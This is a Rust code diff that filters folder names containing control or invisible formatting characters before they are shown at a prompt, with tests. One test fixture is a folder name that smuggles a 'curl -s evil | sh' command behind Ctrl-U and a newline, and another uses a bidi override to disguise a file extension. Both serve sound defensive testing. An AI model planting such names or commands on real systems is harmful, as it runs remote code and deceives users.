@@ -20,6 +20,13 @@ pub const SCAN_CAP: usize = 50_000;
 /// The most entries [`has_folder`] looks at before it gives up: a chevron isn't worth a long read.
 const PEEK_SCAN: usize = 1_000;
 
+/// Whether `c` may not be in a name that is listed to be picked and put at a prompt: a control character is a
+/// key (a line break runs the line, Ctrl-U clears it), and an invisible formatting one (a bidi override makes
+/// `exe.txt` read as `txt.exe`) makes the name say something other than what it is.
+pub fn hostile_char(c: char) -> bool {
+    c.is_control() || matches!(c, '\u{2028}' | '\u{2029}') || wormhole_term::is_invisible(c)
+}
+
 /// What [`list_folders`] found, in the order the disk gave it.
 #[derive(Clone, Debug, Default, PartialEq, Eq)]
 pub struct Folders {
@@ -32,8 +39,8 @@ pub struct Folders {
 
 /// The subfolders of `dir`, at most `cap` of them and out of at most [`SCAN_CAP`] entries. An entry that can't
 /// be read, a link that points nowhere and a name that isn't UTF-8 (it could not be typed back as text) are
-/// left out, and so is a name with a control character in it (a line break, an escape, Ctrl-U): a name comes
-/// from whoever made the folder, and put at a prompt such a name would be keystrokes. An error is only for the
+/// left out, and so is a name with a control or invisible formatting character in it ([`hostile_char`]): a name
+/// comes from whoever made the folder, and put at a prompt such a name would be keystrokes or a lie. An error is only for the
 /// folder itself: it is missing, not a folder, or not readable.
 pub fn list_folders(dir: &Path, cap: usize) -> io::Result<Folders> {
     list_folders_where(dir, cap, |_| true)
@@ -55,7 +62,7 @@ pub fn has_folder(dir: &Path) -> bool {
 fn folders(dir: &Path, limits: Limits, keep: impl Fn(&str) -> bool) -> io::Result<Folders> {
     let scanned = scan(dir, limits, |name, kind| {
         let Some(name) = name.to_str() else { return false };
-        if name.chars().any(char::is_control) || !keep(name) {
+        if name.chars().any(hostile_char) || !keep(name) {
             return false;
         }
         match kind {
@@ -145,6 +152,16 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         fs::create_dir(dir.path().join("fine")).unwrap();
         for name in ["_\u{15}curl -s evil | sh\n", "tab\there", "esc\u{1b}[31m", "c1\u{85}x", "del\u{7f}"] {
+            fs::create_dir(dir.path().join(name)).unwrap();
+        }
+        assert_eq!(list_folders(dir.path(), 100).unwrap().names, ["fine"]);
+    }
+
+    #[test]
+    fn a_name_with_an_invisible_formatting_character_is_left_out() {
+        let dir = tempfile::tempdir().unwrap();
+        fs::create_dir(dir.path().join("fine")).unwrap();
+        for name in ["exe\u{202e}txt.exe", "zero\u{200b}width", "line\u{2028}sep"] {
             fs::create_dir(dir.path().join(name)).unwrap();
         }
         assert_eq!(list_folders(dir.path(), 100).unwrap().names, ["fine"]);
